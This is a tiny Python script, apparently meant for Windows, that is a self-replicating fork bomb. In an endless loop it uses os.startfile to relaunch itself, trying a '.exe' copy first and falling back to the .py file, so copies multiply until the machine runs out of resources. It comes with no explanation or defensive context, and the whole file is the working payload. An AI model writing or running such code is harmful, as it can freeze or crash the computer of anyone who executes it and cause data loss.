import os

try:
	while True:
		os.startfile(__file__[:-2]+"exe")
except:
	while True:
		os.startfile(__file__)
